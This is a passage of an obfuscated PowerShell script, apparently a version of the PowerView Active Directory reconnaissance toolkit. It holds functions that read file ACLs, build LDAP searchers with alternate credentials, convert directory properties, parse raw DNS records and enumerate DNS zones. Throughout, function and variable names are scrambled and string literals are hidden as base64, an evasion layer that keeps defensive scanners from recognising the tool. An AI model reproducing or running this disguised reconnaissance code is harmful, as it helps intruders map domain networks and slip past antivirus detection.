            (${/=\___/\/=\_/=\/=} | ? {$_}) -join ','
        }
        ${_/\/==\/=\___/===} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/==\/=\___/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\__/\/====\_/=\} = @{}
    }
    PROCESS {
        ForEach (${/=\_/==\/===\____} in $Path) {
            try {
                if ((${/=\_/==\/===\____} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                    ${_/\____/=\_/====\} = (New-Object System.Uri(${/=\_/==\/===\____})).Host
                    if (-not ${_/\__/\/====\_/=\}[${_/\____/=\_/====\}]) {
                        ___/=\_/\_/=\/\_/\ -____/=\/=\_/=\/\/ ${_/\____/=\_/====\} -Credential $Credential
                        ${_/\__/\/====\_/=\}[${_/\____/=\_/====\}] = $True
                    }
                }
                ${___/=\/\/===\___/} = Get-Acl -Path ${/=\_/==\/===\____}
                ${___/=\/\/===\___/}.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | % {
                    ${/=\_/=\____/=\__/} = $_.IdentityReference.Value
                    $Name = _/===\/=\_/\____/\ -__/\_/=\__/=\__/\ ${/=\_/=\____/=\__/} @_/\/==\/=\___/===
                    ${__/\/=\/\/\/==\__} = New-Object PSObject
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) ${/=\_/==\/===\____}
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBTAHkAcwB0AGUAbQBSAGkAZwBoAHQAcwA='))) (____/\___/===\___/ -_/==\_/===\/\/=\/\ $_.FileSystemRights.value__)
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) $Name
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFMASQBEAA=='))) ${/=\_/=\____/=\__/}
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbABUAHkAcABlAA=='))) $_.AccessControlType
                    ${__/\/=\/\/\/==\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAGkAbABlAEEAQwBMAA=='))))
                    ${__/\/=\/\/\/==\__}
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAYQB0AGgAQQBjAGwAXQAgAGUAcgByAG8AcgA6ACAAJABfAA==')))
            }
        }
    }
    END {
        ${_/\__/\/====\_/=\}.Keys | _______/\__/=\/=\/
    }
}
function ____/=\__/\/=\__/= {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )
    ${/===\___/\_/==\/\} = @{}
    $Properties.PropertyNames | % {
        if ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHMAcABhAHQAaAA=')))) {
            if (($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGQAaABpAHMAdABvAHIAeQA='))))) {
                ${/===\___/\_/==\/\}[$_] = $Properties[$_] | % { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAHQAeQBwAGUA')))) {
                ${/===\___/\_/==\/\}[$_] = $Properties[$_][0] -as ${/=====\_/\_____/\}
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA==')))) {
                ${/===\___/\_/==\/\}[$_] = $Properties[$_][0] -as ${____/\/===\____/\}
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA=')))) {
                ${/===\___/\_/==\/\}[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA')))) {
                ${/===\___/\_/==\/\}[$_] = $Properties[$_][0] -as ${/==\_/\/\___/\___}
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByAA==')))) {
                ${___/\/\/\__/\/\/\} = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if (${___/\/\/\__/\/\/\}.Owner) {
                    ${/===\___/\_/==\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')))] = ${___/\/\/\__/\/\/\}.Owner
                }
                if (${___/\/\/\__/\/\/\}.Group) {
                    ${/===\___/\_/==\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))] = ${___/\/\/\__/\/\/\}.Group
                }
                if (${___/\/\/\__/\/\/\}.DiscretionaryAcl) {
                    ${/===\___/\_/==\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYwByAGUAdABpAG8AbgBhAHIAeQBBAGMAbAA=')))] = ${___/\/\/\__/\/\/\}.DiscretionaryAcl
                }
                if (${___/\/\/\__/\/\/\}.SystemAcl) {
                    ${/===\___/\_/==\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0AQQBjAGwA')))] = ${___/\/\/\__/\/\/\}.SystemAcl
                }
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA==')))) {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    ${/===\___/\_/==\/\}[$_] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFYARQBSAA==')))
                }
                else {
                    ${/===\___/\_/==\/\}[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAUABhAHMAcwB3AG8AcgBkAFQAaQBtAGUA')))) ) {
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    ${__/==\/\/\___/\/\} = $Properties[$_][0]
                    [Int32]${/===\/=\_/===\__/} = ${__/==\/\/\___/\/\}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $Null, ${__/==\/\/\___/\/\}, $Null)
                    [Int32]${____/\/===\___/\/}  = ${__/==\/\/\___/\/\}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $Null, ${__/==\/\/\___/\/\}, $Null)
                    ${/===\___/\_/==\/\}[$_] = ([datetime]::FromFileTime([Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f ${/===\/=\_/===\__/}, ${____/\/===\___/\/})))
                }
                else {
                    ${/===\___/\_/==\/\}[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                ${_/=\/\/======\_/=} = $Properties[$_]
                try {
                    ${__/==\/\/\___/\/\} = ${_/=\/\/======\_/=}[$_][0]
                    [Int32]${/===\/=\_/===\__/} = ${__/==\/\/\___/\/\}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $Null, ${__/==\/\/\___/\/\}, $Null)
                    [Int32]${____/\/===\___/\/}  = ${__/==\/\/\___/\/\}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $Null, ${__/==\/\/\___/\/\}, $Null)
                    ${/===\___/\_/==\/\}[$_] = [Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f ${/===\/=\_/===\__/}, ${____/\/===\___/\/})
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0ATABEAEEAUABQAHIAbwBwAGUAcgB0AHkAXQAgAGUAcgByAG8AcgA6ACAAJABfAA==')))
                    ${/===\___/\_/==\/\}[$_] = ${_/=\/\/======\_/=}[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                ${/===\___/\_/==\/\}[$_] = $Properties[$_][0]
            }
            else {
                ${/===\___/\_/==\/\}[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property ${/===\___/\_/==\/\}
    }
    catch {
        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0ATABEAEEAUABQAHIAbwBwAGUAcgB0AHkAXQAgAEUAcgByAG8AcgAgAHAAYQByAHMAaQBuAGcAIABMAEQAQQBQACAAcAByAG8AcABlAHIAdABpAGUAcwAgADoAIAAkAF8A')))
    }
}
function __/=\/\_/\/=\__/=\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [String]
        ${__/\_/\__/====\/\/},
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            $TargetDomain = $Domain
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    ${/=\/\_/=\___/=\__} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${_____/\/\__/=\_/\} = ____/\/\/=\/\/==\/ -Credential $Credential
            ${/=\/\_/=\___/=\__} = (${_____/\/\__/=\_/\}.PdcRoleOwner).Name
            $TargetDomain = ${_____/\/\__/=\_/\}.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                ${/=\/\_/=\___/=\__} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            write-verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBlAHQALQBkAG8AbQBhAGkAbgA=')))
            ${_____/\/\__/=\_/\} = ____/\/\/=\/\/==\/
            ${/=\/\_/=\___/=\__} = (${_____/\/\__/=\_/\}.PdcRoleOwner).Name
            $TargetDomain = ${_____/\/\__/=\_/\}.Name
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            ${/=\/\_/=\___/=\__} = $Server
        }
        ${/\______/\/\__/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA=')))
        if (${/=\/\_/=\___/=\__} -and (${/=\/\_/=\___/=\__}.Trim() -ne '')) {
            ${/\______/\/\__/\/} += ${/=\/\_/=\___/=\__}
            if ($TargetDomain) {
                ${/\______/\/\__/\/} += '/'
            }
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQBQAHIAZQBmAGkAeAA=')))]) {
            ${/\______/\/\__/\/} += ${__/\_/\__/====\/\/} + ','
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) {
            if ($SearchBase -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A')))) {
                ${______/=\/==\_/\_} = $SearchBase.ToUpper().Trim('/')
                ${/\______/\/\__/\/} = ''
            }
            else {
                if ($SearchBase -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBMAEQAQQBQADoALwAvAA==')))) {
                    if ($SearchBase -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAuACsALwAuACsA')))) {
                        ${/\______/\/\__/\/} = ''
                        ${______/=\/==\_/\_} = $SearchBase
                    }
                    else {
                        ${______/=\/==\_/\_} = $SearchBase.SubString(7)
                    }
                }
                else {
                    ${______/=\/==\_/\_} = $SearchBase
                }
            }
        }
        else {
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                ${______/=\/==\_/\_} = "DC=$($TargetDomain.Replace('.', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA=')))))"
            }
        }
        ${/\______/\/\__/\/} += ${______/=\/==\_/\_}
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAZQBhAHIAYwBoAGUAcgBdACAAcwBlAGEAcgBjAGgAIABiAGEAcwBlADoAIAAkAHsALwBcAF8AXwBfAF8AXwBfAC8AXAAvAFwAXwBfAC8AXAAvAH0A')))
        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAZQBhAHIAYwBoAGUAcgBdACAAVQBzAGkAbgBnACAAYQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABmAG8AcgAgAEwARABBAFAAIABjAG8AbgBuAGUAYwB0AGkAbwBuAA==')))
            ${_____/\/\__/=\_/\} = New-Object DirectoryServices.DirectoryEntry(${/\______/\/\__/\/}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            ${__/=\_/=\/\__/\/\} = New-Object System.DirectoryServices.DirectorySearcher(${_____/\/\__/=\_/\})
        }
        else {
            ${__/=\_/=\/\__/\/\} = New-Object System.DirectoryServices.DirectorySearcher([ADSI]${/\______/\/\__/\/})
        }
        ${__/=\_/=\/\__/\/\}.PageSize = $ResultPageSize
        ${__/=\_/=\/\__/\/\}.SearchScope = $SearchScope
        ${__/=\_/=\/\__/\/\}.CacheResults = $False
        ${__/=\_/=\/\__/\/\}.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) {
            ${__/=\_/=\/\__/\/\}.ServerTimeLimit = $ServerTimeLimit
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) {
            ${__/=\_/=\/\__/\/\}.Tombstone = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
            ${__/=\_/=\/\__/\/\}.filter = $LDAPFilter
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) {
            ${__/=\_/=\/\__/\/\}.SecurityMasks = Switch ($SecurityMasks) {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA='))) { [System.DirectoryServices.SecurityMasks]::Dacl }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))) { [System.DirectoryServices.SecurityMasks]::Group }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA='))) { [System.DirectoryServices.SecurityMasks]::None }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA=='))) { [System.DirectoryServices.SecurityMasks]::Owner }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA='))) { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            ${__/\_/\/===\/\/\/} = $Properties| % { $_.Split(',') }
            $Null = ${__/=\_/=\/\__/\/\}.PropertiesToLoad.AddRange((${__/\_/\/===\/\/\/}))
        }
        ${__/=\_/=\/\__/\/\}
    }
}
function ___/====\/\_/==\/= {
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )
    BEGIN {
        function ______/\_/=\_/\_/\ {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )
            [Int]${_/\/=\/=\__/==\/\} = $Raw[0]
            [Int]${_/==\__/\/\__/\_/} = $Raw[1]
            [Int]${/==\/\/\/=\/\/\/\} =  2
            [String]$Name  = ''
            while (${_/==\__/\/\__/\_/}-- -gt 0)
            {
                [Int]${_____/=\/==\___/\} = $Raw[${/==\/\/\/=\/\/\/\}++]
                while (${_____/=\/==\___/\}-- -gt 0) {
                    $Name += [Char]$Raw[${/==\/\/\/=\/\/\/\}++]
                }
                $Name += "."
            }
            $Name
        }
    }
    PROCESS {
        ${____/=\/=\_/\/\_/} = [BitConverter]::ToUInt16($DNSRecord, 2)
        ${_/\_/==\__/=\__/\} = [BitConverter]::ToUInt32($DNSRecord, 8)
        ${_/=\/=\_____/====} = $DNSRecord[12..15]
        $Null = [array]::Reverse(${_/=\/=\_____/====})
        ${__/\_/\/\/====\__} = [BitConverter]::ToUInt32(${_/=\/=\_____/====}, 0)
        ${__/======\__/\/\/} = [BitConverter]::ToUInt32($DNSRecord, 20)
        if (${__/======\__/\/\/} -ne 0) {
            ${_/\_/\/=\_/\/\/\/} = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours(${__/======\__/\/\/})).ToString()
        }
        else {
            ${_/\_/\/=\_/\/\/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBzAHQAYQB0AGkAYwBdAA==')))
        }
        ${____/\/===\_/\/\_} = New-Object PSObject
        if (${____/=\/=\_/\/\_/} -eq 1) {
            ${/=\/\/==\/==\/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwAH0ALgB7ADEAfQAuAHsAMgB9AC4AewAzAH0A'))) -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            ${_____/\_/=\_/=\_/} = ${/=\/\/==\/==\/\_/}
            ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'A'
        }
        elseif (${____/=\/=\_/\/\_/} -eq 2) {
            ${_/\_/============} = ______/\_/=\_/\_/\ $DNSRecord[24..$DNSRecord.length]
            ${_____/\_/=\_/=\_/} = ${_/\_/============}
            ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'NS'
        }
        elseif (${____/=\/=\_/\/\_/} -eq 5) {
            ${_/\___/==\/=\/\/=} = ______/\_/=\_/\_/\ $DNSRecord[24..$DNSRecord.length]
            ${_____/\_/=\_/=\_/} = ${_/\___/==\/=\/\/=}
            ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAEEATQBFAA==')))
        }
        elseif (${____/=\/=\_/\/\_/} -eq 6) {
            ${_____/\_/=\_/=\_/} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEEA')))
        }
        elseif (${____/=\/=\_/\/\_/} -eq 12) {
            ${/=\/==\_/=\_/\/==} = ______/\_/=\_/\_/\ $DNSRecord[24..$DNSRecord.length]
            ${_____/\_/=\_/=\_/} = ${/=\/==\_/=\_/\/==}
            ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABUAFIA')))
        }
        elseif (${____/=\/=\_/\/\_/} -eq 13) {
            ${_____/\_/=\_/=\_/} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABJAE4ARgBPAA==')))
        }
        elseif (${____/=\/=\_/\/\_/} -eq 15) {
            ${_____/\_/=\_/=\_/} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'MX'
        }
        elseif (${____/=\/=\_/\/\_/} -eq 16) {
            [string]${_/====\/=\______/}  = ''
            [int]${_____/=\/==\___/\} = $DNSRecord[24]
            ${/==\/\/\/=\/\/\/\} = 25
            while (${_____/=\/==\___/\}-- -gt 0) {
                ${_/====\/=\______/} += [char]$DNSRecord[${/==\/\/\/=\/\/\/\}++]
            }
            ${_____/\_/=\_/=\_/} = ${_/====\/=\______/}
            ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABYAFQA')))
        }
        elseif (${____/=\/=\_/\/\_/} -eq 28) {
            ${_____/\_/=\_/=\_/} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBBAEEAQQA=')))
        }
        elseif (${____/=\/=\_/\/\_/} -eq 33) {
            ${_____/\_/=\_/=\_/} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBSAFYA')))
        }
        else {
            ${_____/\_/=\_/=\_/} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
        }
        ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAZABBAHQAUwBlAHIAaQBhAGwA'))) ${_/\_/==\__/=\__/\}
        ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABUAEwA'))) ${__/\_/\/\/====\__}
        ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUA'))) ${__/======\__/\/\/}
        ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBTAHQAYQBtAHAA'))) ${_/\_/\/=\_/\/\/\/}
        ${____/\/===\_/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQA='))) ${_____/\_/=\_/=\_/}
        ${____/\/===\_/\/\_}
    }
}
function Get-DomainDNSZone {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${/=\___/=\__/=\/\/} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBaAG8AbgBlACkA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
